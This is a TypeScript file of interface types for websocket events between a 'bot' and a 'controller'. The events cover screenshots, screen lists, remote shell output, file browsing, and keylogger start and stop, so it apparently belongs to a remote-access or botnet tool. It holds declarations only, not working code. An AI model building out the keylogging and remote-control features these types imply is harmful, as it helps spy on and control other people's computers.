import { DirEntry } from "@/src/modules/ws-client/types/tasks.type";

export interface WsBotSendMessage {
  title?: string;
  message: string;
  controllerid: string;
}

export interface WsBotConnectionEvent {
  controllerid: string;
  clientid: string;
}

export interface WsBotSendScreensEvent {
  controllerid: string;
  screens: {
    id: number;
    resolution: [number, number];
    frequency: number;
    isprimary: boolean;
  }[];
}

export interface WsBotSendScreenshotEvent {
  controllerid: string;
  buffer: ArrayBuffer;
}

export interface WsBotSendCmdCommandEvent {
  controllerid: string;
  stdout: string;
  pwd: string;
}

export interface WsBotSendExplorerEvent {
  controllerid: string;
  files: DirEntry[];
  folder: string;
  relativepath: string;
}

export interface WsBotKeyLoggerStart {
  controllerid: string;
}

export interface WsBotKeyLoggerStop {
  controllerid: string;
}
